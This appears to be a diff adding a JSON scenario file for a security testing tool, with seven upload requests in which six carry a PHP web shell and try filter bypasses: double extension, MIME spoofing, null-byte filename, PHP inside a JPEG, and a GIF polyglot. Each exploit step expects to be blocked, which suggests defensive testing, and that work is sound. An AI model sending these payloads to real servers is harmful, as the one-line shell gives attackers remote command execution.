@@ -1,0 +1,172 @@
+{
+  "id": "file-upload-bypass",
+  "name": "Malicious File Upload Bypass",
+  "category": "File Upload Attacks",
+  "difficulty": "Intermediate",
+  "description": "File upload filter bypass techniques including extension manipulation, MIME type spoofing, and payload embedding",
+  "steps": [
+    {
+      "id": "upload-recon-1",
+      "name": "Upload Endpoint Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/upload"
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "upload-recon-2",
+      "name": "Allowed File Types Test",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\nContent-Type: text/plain\r\n\r\nThis is a test file.\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "dependsOn": [
+        "upload-recon-1"
+      ]
+    },
+    {
+      "id": "upload-exploit-1",
+      "name": "PHP Web Shell Upload",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "upload-recon-2"
+      ]
+    },
+    {
+      "id": "upload-exploit-2",
+      "name": "Double Extension Bypass",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.txt\"\r\nContent-Type: text/plain\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "upload-exploit-1"
+      ]
+    },
+    {
+      "id": "upload-exploit-3",
+      "name": "MIME Type Spoofing",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"image.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "upload-exploit-2"
+      ]
+    },
+    {
+      "id": "upload-exploit-4",
+      "name": "Null Byte Injection",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php%00.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 3500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "upload-exploit-3"
+      ]
+    },
+    {
+      "id": "upload-exploit-5",
+      "name": "Embedded PHP in Image",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"profile.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nJFIF_HEADER<?php system($_GET['cmd']); ?>_JPEG_EOF\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 4000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "upload-exploit-4"
+      ]
+    },
+    {
+      "id": "upload-exploit-6",
+      "name": "Polyglot File Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        },
+        "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"polyglot.gif\"\r\nContent-Type: image/gif\r\n\r\nGIF89a/*<?php system($_GET['cmd']); ?>*/\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+      },
+      "execution": {
+        "delayMs": 4500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "upload-exploit-5"
+      ]
+    }
+  ]
+}
